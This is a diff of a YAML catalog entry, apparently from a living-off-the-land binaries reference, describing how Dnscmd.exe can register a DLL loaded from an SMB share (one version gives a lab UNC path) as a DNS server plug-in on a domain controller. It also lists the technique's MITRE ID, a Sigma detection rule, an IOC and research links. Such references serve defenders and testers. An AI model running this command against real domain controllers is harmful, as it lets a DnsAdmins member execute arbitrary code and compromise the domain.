@@ -1,24 +1,25 @@
 ---
 Name: Dnscmd.exe
 Description: A command-line interface for managing DNS servers
-Author: 'Oddvar Moe'
+Author: Oddvar Moe
 Created: 2018-05-25
 Commands:
-  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll
+  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll {PATH_SMB:.dll}
     Description: Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.
     Usecase: Remotely inject dll to dns server
     Category: Execute
     Privileges: DNS admin
     MitreID: T1543.003
     OperatingSystem: Windows server
+    Tags:
+      - Execute: DLL
+      - Execute: Remote
 Full_Path:
   - Path: C:\Windows\System32\Dnscmd.exe
   - Path: C:\Windows\SysWOW64\Dnscmd.exe
-Code_Sample:
-- Code:
 Detection:
- - Sigma: https://github.com/SigmaHQ/sigma/blob/b08b3e2b0d5111c637dbede1381b07cb79f8c2eb/rules/windows/process_creation/process_creation_dns_serverlevelplugindll.yml
- - IOC: Dnscmd.exe loading dll from UNC/arbitrary path
+  - Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_dnscmd_install_new_server_level_plugin_dll.yml
+  - IOC: Dnscmd.exe loading dll from UNC/arbitrary path
 Resources:
   - Link: https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83
   - Link: https://blog.3or.de/hunting-dns-server-level-plugin-dll-injection.html
@@ -27,9 +28,7 @@ Resources:
   - Link: http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html
 Acknowledgement:
   - Person: Shay Ber
-    Handle:
   - Person: Dimitrios Slamaris
     Handle: '@dim0x69'
   - Person: Nikhil SamratAshok
     Handle: '@nikhil_mitt'
----
